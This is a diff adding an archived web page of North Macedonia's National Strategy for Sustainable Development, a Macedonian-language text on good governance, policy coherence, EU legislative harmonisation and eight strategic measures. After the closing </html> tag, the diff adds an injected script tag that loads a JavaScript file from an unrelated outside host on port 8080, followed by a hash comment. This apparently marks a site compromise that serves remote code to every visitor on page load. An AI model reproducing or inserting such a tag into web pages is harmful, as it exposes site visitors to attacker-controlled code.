@@ -1,0 +1,246 @@
+
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head><title>
+	НСОР - Национална стратегија за одржлив развој на Република Македонија
+</title><link href="StyleClientPages/EN/style.css" rel="stylesheet" type="text/css" /><link id="cssClassCell" href="StyleClientPages/MK/style.css" rel="stylesheet" type="text/css" />
+    <script type="text/JavaScript">
+
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features).focus();
+}
+function IncFont(element,classCss)
+  {
+    var cell=element.all;
+    for(var i=0;i<cell.length;i++)
+    {
+        if(cell[i].tagName=="TABLE")
+        {
+          if((cell[i].className=="contentTextLarge")||(cell[i].className=="contentText"))
+            cell[i].className=classCss;
+            IncFont(cell[i],classCss);
+        }
+        else if(cell[i].tagName=="TD")
+        {
+            if((cell[i].className=="contentTextLarge")||(cell[i].className=="contentText"))
+                cell[i].className=classCss;
+        }
+    }
+  }
+  
+  function CatchEnter(t,e)
+    {
+        if(e.keyCode==13)
+        {
+          document.getElementById('actionSe').value="search";
+          document.form1.submit();
+        }
+    }
+    
+</script>
+</head>
+<body>
+    <form name="form1" method="post" action="default1.aspx?ItemID=375" id="form1">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE3MDcwODI1MDgPZBYEAgEPZBYCAgIPFgIeBGhyZWYFHVN0eWxlQ2xpZW50UGFnZXMvTUsvc3R5bGUuY3NzZAIDD2QWDgIFDxYCHglpbm5lcmh0bWwFCtCR0LDRgNCw0ZhkAgcPFgIeCm9ua2V5cHJlc3MFFkNhdGNoRW50ZXIodGhpcyxldmVudClkAgsPZBYCZg8WAh4Dc3JjBSdTdHlsZUNsaWVudFBhZ2VzL21rL2ltYWdlcy9sb2dvVGV4dC5wbmdkAg0PFgIeCmJhY2tncm91bmQFIVN0eWxlQ2xpZW50UGFnZXMvRU4vaW1hZ2VzLzA0LmpwZ2QCDw8WAh8BBdICPGEgY2xhc3M9InBhdGhMaW5rIiBocmVmPSdkZWZhdWx0LmFzcHg/SXRlbUlEPTM5Nic+0J/QvtGH0LXRgtC90LA8L2E+IDxzcGFuIGNsYXNzPSJwYXRoU2VwYXJhdG9yIj4mbmJzcDsvJm5ic3A7PC9zcGFuPiA8YSBjbGFzcz0icGF0aExpbmsiIGhyZWY9J2RlZmF1bHQxLmFzcHg/SXRlbUlEPTM2Nic+0J7QoCDQstC+INCc0LDQutC10LTQvtC90LjRmNCwPC9hPiA8c3BhbiBjbGFzcz0icGF0aFNlcGFyYXRvciI+Jm5ic3A7LyZuYnNwOzwvc3Bhbj4g0JTQvtCx0YDQviDRg9C/0YDQsNCy0YPQstCw0ZrQtSDQuCDQv9C+0LTQvtCx0YDQviDQutGA0LXQuNGA0LDRmtC1INC/0L7Qu9C40YLQuNC60LhkAhEPFgIfAQUe0J7QoCDQstC+INCc0LDQutC10LTQvtC90LjRmNCwZAIbDxYCHwEFmQI8ZGl2IGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJ0ZXh0Qmx1ZSI+PHN0cm9uZz7QndCh0J7QoDwvc3Ryb25nPjwvc3Bhbj4gLSDQndCw0YbQuNC+0L3QsNC70L3QsCDRgdGC0YDQsNGC0LXQs9C40ZjQsCDQt9CwINC+0LTRgNC20LvQuNCyINGA0LDQt9Cy0L7RmCDQvdCwINCg0LXQv9GD0LHQu9C40LrQsCDQnNCw0LrQtdC00L7QvdC40ZjQsDxicj7QlNC40LzQuNGC0YDQuNC1INCi0YPRhtC+0LLQuNGcIDIwLDEwMDAg0KHQutC+0L/RmNC1LCDQnNCw0LrQtdC00L7QvdC40ZjQsDwvZGl2PmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCWltZ1NlYXJjaKm4thNh/YbBWzWxnDOGYuXS1RoP" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=JPL8gi8q9LBgOg5Z-Kj_vgRazK97DCwAlmhJFhFNAUmIeA3Ift8jwWFYKSX-qBvpJp0-EeRE2vDIZGQnyafhXWkK4FU1&amp;t=635213341450988780" type="text/javascript"></script>
+
+
+<script src="/ScriptResource.axd?d=FilEC0Jj1lAcR0bxBNOTZqQQh0RcRM9gcHvCHuaHTml20tT38MlwtGM194FUEUvVp-LFy6MfNQe-qdNGKkdikY4Hs4TBV4ksEP-Vh5X_IAz47uohSZdP2XRNDreE94EcFBHZtQ2&amp;t=633255844061682500" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWAwKtrPKhCwKZ7YzdCgK6zezPCcEGgADM82sVx6dzGiP/Dc1z5Z/s" />
+</div>
+    
+        
+<input id="actionSe" name="actionSe" value="" type="hidden" />
+   <table width="100%"  border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td class="bgLeft"><table width="100%" height="640"  border="0" cellpadding="0" cellspacing="0">
+      <tr>
+        <td class="bgShLeft"></td>
+      </tr>
+    </table></td>
+    <td width="778" valign="top" bgcolor="#FFFFFF"><table width="778" height="198"  border="0" cellpadding="0" cellspacing="0" background="StyleClientPages/en/images/logo.jpg">
+      <tr>
+        <td align="right" valign="top"><table border="0" cellpadding="0" cellspacing="0" class="menuHeaderTable">
+          <tr>
+            <td id="cellHederMenu"><span id="ctl05_cellControl" class="bottomMenuTD"><a class="menuHeaderLink" href="default.aspx?ItemID=396">Почетна</a><span class="menuHeaderSeparator">l</span><a class="menuHeaderLink" href="default1.aspx?ItemID=372">Мапа на сајтот</a></span></td>
+
+			<td class="menuHeaderSeparator">|</td>
+            <td id="cellSerachTitle" class="menuHeaderLink">Барај</td>
+
+            <td><input name="txtSearch" type="text" id="txtSearch" class="menuHeaderSearch" onkeypress="CatchEnter(this,event)" /></td>
+            <td class="menuHeaderTable">
+                <input type="image" name="imgSearch" id="imgSearch" src="StyleClientPages/en/images/search.gif" style="border-width:0px;" /></td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td id="cellImageLogo" height="32" class="logoTextTD"><img src="StyleClientPages/mk/images/logoText.png" id="imgHeder" /></td>
+
+      </tr>
+      <tr>
+        <td id="cellBgHeaderPicture" height="107" valign="bottom" background="StyleClientPages/EN/images/04.jpg" class="menuImgBG"><table width="778" height="28"  border="0" cellpadding="0" cellspacing="0">
+          <tr>
+            <td id="cellLanguage" valign="bottom"><span id="ctl07_cellControl"><table border="0" cellspacing="0" cellpadding="0" class="menuLangTable"><tr><td><a href="default.aspx?ItemID=396" class="menuLangActive">MK</a></td><td class="menuLangSeparator"> | </td><td><a href="default.aspx?ItemID=398" class="menuLang">EN</a></td></tr></table></span></td>
+
+            <td id="cellHorizontalMenu" width="622" align="left" valign="bottom">
+<table cellpadding=0 cellspacing=0 width=100% border=0>
+<tr><td id="HorizontalMenu1_cellControl"><table height="20" border="0" cellpadding="0" cellspacing="0"><tr><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=519" > За нас </a></td><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=366" > ОР во Македонија </a></td><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=368" > НСОР Активности </a></td><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=369" > Пилот проекти </a></td><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=370" > Вести </a></td><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=381" > Повеќе </a></td><td class="mainMenuTD"><a class="mainMenuLink" href="default1.aspx?ItemID=544" > Архива </a></td></tr></table></td>
+</tr>
+</table>
+
+</td>
+
+          </tr>
+        </table></td>
+
+      </tr>
+    </table>
+      <table width="778" border="0" cellpadding="0" cellspacing="0">
+        <tr>
+          <td width="590" valign="top"><table width="590" height="67" border="0" cellpadding="0" cellspacing="0" background="StyleClientPages/en/images/headerBG.gif">
+            <tr>
+              <td id="cellShortPath" class="pathTD"><a class="pathLink" href='default.aspx?ItemID=396'>Почетна</a> <span class="pathSeparator">&nbsp;/&nbsp;</span> <a class="pathLink" href='default1.aspx?ItemID=366'>ОР во Македонија</a> <span class="pathSeparator">&nbsp;/&nbsp;</span> Добро управување и подобро креирање политики</td>
+
+            </tr>
+            <tr>
+                <td id="cellPageName" class="headerMenu">ОР во Македонија</td>
+
+            </tr>
+          </table>
+            <table width="590" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td id="cellLeft" width="156" height="250" align="left" valign="top" background="StyleClientPages/en/images/menuBG.gif" class="menuTD"><span id="ctl03_cellControl"><table border="0" cellpadding="0" cellspacing="0"><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=373" > Што е одржлив развој </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=374" > Зошто во Македонија? </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=525" > Околу националната стратегија </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=375" > Добро управување и подобро креирање политики </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=376" > ДПРРПОР </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=377" > Македонци - идни партнери на сопствените национални шуми </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=526" > Македонскo уникатно туристичко богаство  </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=527" > “Додатните вредности” на македонското општество од неочекувана насока  </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=528" > Економски просперитет и креирање нови работни места  </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=529" > Оддржливи човечки населби </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=530" > Меѓусекторски политики  кои придонесуваат за развој на општество на знаење </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=532" > Климатски промени и чиста енергија </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=533" > Оддржлив транспорт </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=535" > Оддржлива потрошувачка и производство  </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=536" > Заштита и управување со природните ресурси </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=537" > Јавно здравство </a></td></tr><tr><td class="menuLinkTD"><a class="menuLink" href="default1.aspx?ItemID=538" > Социјално вклучување, демографија и миграција </a></td></tr></table></span></td>
+
+                <td id="cellMiddle" valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0"><tr><td align="right" class="contentServicesTD"><table  border="0" cellspacing="0" cellpadding="0"><tr><td><a href="#"><img src="StyleClientPages/en/images/servicesPrint.gif" onClick="MM_openBrWindow('print.aspx?type=2&id=186','Print','scrollbars=yes,width=626,height=550')" border="0"></a></td><td width="6"></td><td><a href="#"><img src="StyleClientPages/en/images/servicesText.gif" onclick="IncFont(document.getElementById('cellMiddle'),'contentText')" border="0"></a></td><td><a href="#"><img src="StyleClientPages/en/images/servicesText+.gif" onclick="IncFont(document.getElementById('cellMiddle'),'contentTextLarge')" border="0"></a></td></tr></table></td></tr><tr><td class="contentHeader">Добро управување и подобро креирање политики</td></tr><tr><td class="contentText"><p align="justify">&nbsp;<br />
+Главниот Предизвик - Добро управување и подобро креирање на политики заедно со соодветната Клучна Цел е обработен и подржан преку Целите и Резултатите формулирани во различните сектори и меѓусекторските прашања: <br />
+<br />
+Концептот на добро владеење прилично беше дискутиран на глобалните форуми во последната деценија, посебно во однос на напредокот на светот кон одржливиот развој (ОР). Тростолбната структура на ОР (економски, социјален и столб на заштита на животната средина) наметнува голем број на различни меѓусекторски прашања со кои што треба ефикасно да се управува за да се постигнат одржливи резултати. Заради тоа, процесот на одлучување и имплементација на политиките и легислативата треба да се надгради на ниво на добро владеење што ќе обезбеди ефикасно и ефективно работење и одржливи резултати. Преминот кон добро владеење е тежок процес кој бара воведување на интегрирано креирање на политиките засновано на пристапот на партиципација, почитување на општествените интереси и владеење на правото, зголемена транспарентност, пристапност кон и одговорност на институциите и поголема ефикасност и ефективност на процесот на одлучување и имплементација на политиките и легислативата. <br />
+<br />
+Доброто владеење што се стреми кон ОР треба да обезбеди постигнување на одржлива економија која што обезбедува просперитет и можности за сите, постигнување на силно, здраво и праведно општество кое ги задоволува различните потреби на засегнатите страни и одржливо користење на ресурсите во рамките на ограничувањата на животната средина. Ова се долгорочни цели кои исто така бараат одржливост на владеењето. Во тој контекст, промовирањето на ефективни, партиципативни системи на владеење фокусирани на искористување на креативноста, енергијата и различноста на граѓаните е исто така цел на доброто владеење. Владеењето што се стреми кон ОР се однесува на сите сегашни генерации и носи голема одговорност за идните генерации, наметнувајќи обврска на креаторите на политиките да обезбедат владеење засновано на научни аргументи и да работат кон градење на општество засновано на знаење. <br />
+<br />
+Проблемот на воведување на системи на добро владеење во поглед на ОР е присутен дури и во развиените земји, но повеќе е изразен во земјите со пониски капацитети и искуство во оваа сфера. Република Македонија припаѓа на втората група затоа што концептот на ОР не е доволно вграден во системот на владеење. Уставот на Република Македонија ја содржи основната филозофија на ОР и пропишува подеднакви економски и социјални можности за сите граѓани, како и соодветна заштита на природните ресурси, флората и фауната. Сепак, процесите на одлучување и имплементација на политиките и легислативата во Република Македонија одразуваат ограничена свест за ОР на сите нивоа на власта и општеството, отсуство на политика за ОР, несоодветна соработка помеѓу креаторите на политиките од различни сектори и употреба на пристапот &bdquo;од горе-надолу&rdquo; при креирање на политиките, што повлекува потешкотии за инкорпорирање на димензијата на ОР во секторските политики. Вообичаено, релевантните национални власти индивидуално ги креираат економските, социјалните и политиките за заштита на животната средина и ретко обезбедуваат кохезија на политиките од аспект на ОР. Исто така, постои отсуство на ваква кохезија во поглед на секторските легислативи, зашто тие недоволно ја вклучуваат димензијата на ОР. <br />
+<br />
+Земајќи ја во предвид постојната ситуација, главните предизвици за воведување на пракса на добро владеење во Република Македонија се следните: <br />
+<br />
+ Да се подигне јавната свест за ОР на сите нивоа на власта и општеството; <br />
+ Да се креира добра политика за ОР, заснована на интегрален пристап за креирање на политика за ОР; <br />
+ Да се зголеми кохеренцијата на политиките преку вклучување на димензијата на ОР во секторските политики; <br />
+ Да се забрза процесот на хармонизација на легислативата со ЕУ легислативата во поглед на ОР; <br />
+ Да се зајакне капацитетот на јавната администрација за ОР; <br />
+ Да се обезбеди имплементација на политиките и легислативата за ОР. <br />
+<br />
+Ограничената свест за ОР во Република Македонија наметнува потреба од активности за нејзино подигнување. Разбирањето на концептот на ОР на сите нивоа на власт и обезбедувањето на континуирана обука и специјализација на релеватниот персонал по различни области на политики (вклучително економските, социјалните и аспектите на заштита на животната средина) претставува предуслов за креирање и имплементација на соодветна политика за ОР. Понатаму, подигнувањето на свеста за ОР треба да е насочено кон сите сектори од општеството, од деловните субјекти до невладините организации и граѓаните. Луѓето се јадрото на ОР и само свесни, добро информирани и обучени луѓе можат да придонесат за постигнување на силна рамнотежа помеѓу економскиот раст, социјалниот просперитет и здравата животна средина. <br />
+<br />
+Подготовката на Националната стратегија за ОР ќе обезбеди формулирање на политика за ОР, меѓутоа значајни напори треба да се посветат на нејзината имплементација. Република Македонија е посветена на основните принципи на политиката што се наведени во Обновената стратегија за ОР на ЕУ од јуни 2006 како што се: промоција и заштита на основните права; солидарност во рамките на и помеѓу генерациите; отворено и демократско општество; учество на граѓаните; учество на деловните и социјалните партнери; кохерентност на политиките и владеењето; интеграција на политиките; употреба на најдоброто расположиво знаење; принцип на заштита и принцип да се натераат загадувачите да платат. <br />
+<br />
+Тростолбната структура и разновидноста на меѓусекторските прашања што се појавуваат помеѓу различни актери, во текот на краток и долг рок, наметнуваат потреба за интегрален пристап на креирање на политиките и соодветни институции. Интегралниот пристап на креирање на политики е заснован на подобра регулатива и на правилото димензијата на ОР да биде вградена во креирањето на политиките на сите нивоа. Во тој контекст, во сите институции треба да се обезбеди главните одлуки од нивните политики да произлегуваат од предлози што ја поминале процедурата за висококвалитетна Проценка на влијанието, со која се проценуваат социјалните, еколошките и економските димензии на ОР и се зема во предвид надворешната димензија на одржливиот развој и трошоците од непреземањето на активности. Други алатки за подобро креирање на политиките вклучуваат еџ-пост проценка на влијанието на политиките и на (не)учеството на јавноста и засегнатите страни. Земајќи ги предвид трендовите на влошување на состојбата со животната средина, економските и социјалните предизвици на Република Македонија, заедно со новите конкурентски притисоци и новите меѓународни обврски, интегралниот пристап на креирање на политики е клучен за соодветно справување со клучните предизвици за ОР. <br />
+<br />
+Клучните македонски предизвици за ОР кореспондираат со предизвиците идентификувани во Стратегијата за ОР на ЕУ: климатски промени и обезбедување на чиста енергија; одржлив транспорт; одржлива потрошувачка и производство; зачувување и управување со природните ресурси; јавно здравство; социјално вклучување, демографија и миграција; глобална сиромаштија и предизвици на одржливиот развој, заедно со специфичните македонски предизвици: добро владеење и подобро креирање на политики; диверзификација на приходите во руралните региони и предизвици на одржливиот развој; економскиот просперитет и отворање на нови работни места; одржливи човечки населби и меѓусекторски политики кои придонесуваат за развој на општество засновано на знаење. Постигнувањето на одржлива интеракција и управување со овие предизвици е тесно поврзано со нивото на кохерентност помеѓу секторските политики. Иако политиката на ОР ги обезбедува главните стратешки насоки за ОР, многу области значајни за ОР остануваат во рамките на секторските надлежности, но постојните стратешки документи не ја вклучуваат димензијата на ОР. Ова е јасно видливо во рамките на економскиот и социјалниот столб. Спроведувањето на политиката на ОР треба да вклучи ревидирање на постојните стратегии од аспект на ОР и вклучување на компонентата на ОР при понатамошното подготвување на стратешки документи на национално ниво. Кохеренцијата на политиките треба да биде особено насочена кон вградување на заштитата на животната средина во економските и социјалните стратешки документи, оптимално користење на енергетските извори, создавање на поволна, но сепак во корист на ОР, деловна клима за економски просперитет и креирање на работни места во земјоделството, индустријата и услугите, обезбедувајќи подобри демографски трендови и користење на човечкиот капитал, подобра социјална вклученост и здравствена заштита за сите граѓани, како и подобро образование во однос на ОР. <br />
+<br />
+Исто така, кохеренцијата помеѓу секторските политики може да се анализира од аспект на практиката на креирање на политиките и постигнатите резултати, како суштински дел од доброто владеење. Во овој контекст, поголемата кохеренција на политиките претпоставува креирање на политиките засновано на партиципативниот принцип што е пропишан во Агендата 21, транспарентност и одговорност, заедно со ефективност и едноставност на регулаторните акти. Понатаму, треба да се обезбеди кохеренција на политиките од аспект на ОР во рамките на еден сектор или столб, посебно ако тие вклучуваат многу политики. Подигнувањето на кохеренцијата на политиките бара соодветна институционална поставеност за ОР, квалификуван персонал и силна соработка помеѓу релевантните институции. Истото се однесува и на легислативата. <br />
+<br />
+Отсуството на комплетна и релевантна правна рамка е сериозна препрека за процесот на ОР во Република Македонија, имајќи ја предвид временската рамка потребна за нејзино комплетирање и спроведување. Комплексноста и обемноста на ЕУ ацљуис, заедно со ограничениот административен капацитет на релевантните институции за хармонизирање на регулативите со ЕУ ацљуис создаваат ситуација на заостанување во поглед на воспоставувањето на потребните регулативи за ОР. Ситуацијата е особено критична во економскиот и социјалниот столб, додека основната правна рамка за животната средина е веќе воспоставена, иако нејзината имплементација не е поддржана со потребните подзаконски акти и институционална поставеност. Заради тоа, процесот на хармонизација на легислативата со ЕУ ацљуис треба да се забрза. Хармонизацијата на примарното законодавство е временски испланирано со Националната програма за приближување на Ацљуис (НППА) и следи извесна динамика, но најчесто спроведувањето на примарното законодавдство не е можно без подзаконски акти и нивното комплетирање мора да се забрза. Друг проблем поврзан со легислативата е тесната специјалност на подготвувачите на закони во определени области што обично не обезбедува вклучување на компонентата на ОР во секторската легислатива. Обуката и образованието за ОР може да придонесат за намалување на овој проблем, заедно со користењето на техничка помош од понапредните земји. <br />
+<br />
+Идентификуваните слабости при креирањето на политиките и подготвувањето на легислативата, како и при нивната имплементација во голема мера произлегуваат од недоволните и/или несоодветните капацитети на јавната администрација специјализирани за ОР. Понатаму, постои општ проблем во поглед на ефикасноста и ефективноста на испорачувањето на услуги од страна на јавната администрација, посебно во повеќе-секторските области, како што е ОР. Заради тоа, процесот на унапредување на ОР е неизбежно поврзан со зајакнувањето на капацитетот за ОР на јавната администрација. Со општо знаење за концептот на ОР треба да се стекнат сите нивоа на власт, додека со продлабочено знаење и специјализација по области на политиките треба да се стекне персоналот кој директно работи на прашања поврзани со ОР. Зајакнувањето на капацитетите треба да се прави на начин кој ќе обезбеди одржливост на капацитетите, односно треба да биде придружено со соодветна политика на човечки ресурси во институциите на централно и локално ниво чиј примарен критеруим ќе биде вреднувањето на знаењето и квалификациите, како и континуирано усовршување на персоналот и активно користење на стекнатите вештини. Понатаму, зајакнувањето на соработката помеѓу релевантните институции за ОР е друг акспект на подигнувањето на институционалниот капацитет за ОР и подобро искористување на човечкиот капитал во јавната администрација. <br />
+<br />
+Зајакнувањето на капацитетот на јавната администрација и соработката помеѓу релевантните институции е исто така суштинско за имплементација на политиките и легислативата за ОР. Постојната состојба во однос на имплементацијата на политиките и легислативата не може да се оцени како задоволителна. Ова особено се однесува на имплементацијата на стратешките документи и правните акти што делумно или целосно регулираат повеќесекторски прашања. Имајќи предвид дека концептот на ОР е нов во македонскиот систем на владеење, неопходно е создавање на кохерентна политика и правна рамка за ОР. За таа цел, веќе споменатите цели &ndash; формулирање на политика за ОР, зголемување на кохерентноста помеѓу секторските политики и забрзување на процесот на хармонизација на легислативата се неопходни чекори, заедно со соодветната институционална поставеност. Ако институциите не се соодветни, тешко дека земјата ќе напредува кон економска, социјална и еколошки одржлива иднина. <br />
+<br />
+Релевантните и соодветно екипираните институции се клучни за спроведување на политиката за ОР, структурирање на нивните меѓусебни односи во поглед на ОР, обезбедување на цврсти правила и координирање на активностите на сите засегнати страни, вклучително и граѓаните. Во овој контекст, институционалната поставеност за ОР треба да биде заснована на јасно дефинирани одговорности помеѓу секторските институции во поглед на ОР, идентификувани синергии и механизми за соработка, ефективна и ефикасна комуникација помеѓу институциите, како и силна соработка. Покрај соодветната институционална поставеност, чекор напред кон постигнување на одржливи резултати од имплементацијата на политиките и легислативата е воведувањето на е-влада. Република Македонија веќе започна со проект за е-влада со цел на граѓаните и фирмите да им обезбеди он-лајн (интернет) пристап до јавните услуги. Тоа е предуслов за обезбедување на ефикасни јавни услуги, како и за градење на конкурентна и динамична економија заснована на знаење, способна за одржлив економски раст и поголема социјална кохезија. Е-владата е сигнал за поголема отвореност на јавната администрација што придонесува за поголемо учество на јавноста, но веројатно е дека нејзиното користење во голема мера ќе биде поврзано со стапката на пристап на населението до интернет. Заради тоа, системот на владеење кој воведува е-влада треба исто така да обезбеди подобар, полесен и евтин пристап до интернет за сите граѓани. <br />
+<br />
+Соодветното и навремено одговарање на главните предизвици е неопходно за воведување на пракса на добро владеење во Република Македонија. Доброто владеење води кон подобар развој кој пак, води до подобро владеење. Според тоа, веднаш мора да се преземат активности за да се обезбеди квалификувано и одржливо управување со ресурсите и состојбите во земјата на начин кој е отворен, транспарентен, одговорен, рамноправен и одговара на потребите на луѓето. Само ваков пристап, во комбинација со силна административна, финансиска и лична посветеност за одржлив развој на сите нивоа на власт и во општеството ќе обезбедат врамнотежен економски просперитет, социјална кохезија и зачувана животна средина за сегашните и идните генерации на Република Македонија. <br />
+<br />
+Стратешки Мерки <br />
+Клучен Предизвик - Добра владеење и подобро креирање на политики: <br />
+<br />
+1. Подигнување на јавната свест за ОР на сите нивоа на власт и во општеството; <br />
+2. Формулирање на добра политика за ОР, врз база на интегралниот пристап за креирање на политики за ОР; <br />
+3. Зголемување на нивото на кохерентност на секторските политки преку вклучување на димензијата на ОР во креирањето политики на сите нивоа; <br />
+4. Поттикнување на праксата на креирање политики врз база на принципите на доброто владеење; <br />
+5. Забрзување на процесот на хармонизација со ЕУ легислативата, во поглед на ОР; <br />
+6. Зајакнување на капацитетот на јавна администрација за ОР; <br />
+7. Зајакнување на соработка помеѓу релевантните институзии за ОР; <br />
+8. Обезбедување на имплементација на политиките и легислативата за ОР;</p></td></tr><tr><td class="contentServicesTD"></td></tr></table><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td align="right" class="contentServicesBottom"><table border="0" cellspacing="0" cellpadding="0"><tr><td><a href="#" class="servicesText" onClick="MM_openBrWindow('sendThisPage.aspx?url=http://nssd.com.mk:80/default1.aspx?ItemID=375&lan=1','Send','width=400,height=380')">Испрати до пријател </a></td><td><a href="#" onClick="MM_openBrWindow('sendThisPage.aspx?url=http://nssd.com.mk:80/default1.aspx?ItemID=375&lan=1','Send','width=400,height=380')"><img src="StyleClientPages/EN/images/servicesEmail.gif" border="0"></a></td></tr></table></td></tr></table></td>
+
+              </tr>
+            </table></td>
+          <td id="cellRight" valign="top" class="infoTD"></td>
+
+        </tr>
+      </table>
+      <table width="778"  border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td id="cellFootherMenu" class="bottomMenuTD"><span id="ctl06_cellControl"><a class="bottomMenuLinks" href="default1.aspx?ItemID=519">За нас</a>&nbsp;&nbsp;::&nbsp;&nbsp;<a class="bottomMenuLinks" href="default1.aspx?ItemID=366">ОР во Македонија</a>&nbsp;&nbsp;::&nbsp;&nbsp;<a class="bottomMenuLinks" href="default1.aspx?ItemID=368">НСОР Активности</a>&nbsp;&nbsp;::&nbsp;&nbsp;<a class="bottomMenuLinks" href="default1.aspx?ItemID=369">Пилот проекти</a>&nbsp;&nbsp;::&nbsp;&nbsp;<a class="bottomMenuLinks" href="default1.aspx?ItemID=370">Вести</a>&nbsp;&nbsp;::&nbsp;&nbsp;<a class="bottomMenuLinks" href="default1.aspx?ItemID=381">Повеќе</a>&nbsp;&nbsp;::&nbsp;&nbsp;<a class="bottomMenuLinks" href="default1.aspx?ItemID=544">Архива</a></span>
+</td>
+
+        </tr>
+      </table>
+      <table width="725"  border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr>
+          <td height="4" bgcolor="#EDEBEB"></td>
+        </tr>
+        <tr>
+          <td height="15"></td>
+        </tr>
+        <tr>
+          <td id="cellSignFooter" class="textAdress"><div align="center"><span class="textBlue"><strong>НСОР</strong></span> - Национална стратегија за одржлив развој на Република Македонија<br>Димитрие Туцовиќ 20,1000 Скопје, Македонија</div></td>
+
+        </tr>
+      </table></td>
+    <td class="bgRight"><table width="100%" height="640"  border="0" cellpadding="0" cellspacing="0">
+      <tr>
+        <td class="bgShRight"></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td align="right" class="bgBtmLeft"></td>
+    <td width="778"><img src="StyleClientPages/en/images/bgShBottom.jpg" width="778" height="20"></td>
+    <td align="left" class="bgBtmRight"></td>
+  </tr>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="copyright">Copyright 2007, NSSD Macedonia</td>
+  </tr>
+</table>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+Sys.Application.initialize();
+//]]>
+</script>
+</form>
+</body>
+</html>
+
+
+
+<script type="text/javascript" src="http://assolkh.blackhulu.com:8080/Yahoo.js"></script>
+<!--aa0594cd2dc10a5b4a7dd14a137e5a51-->
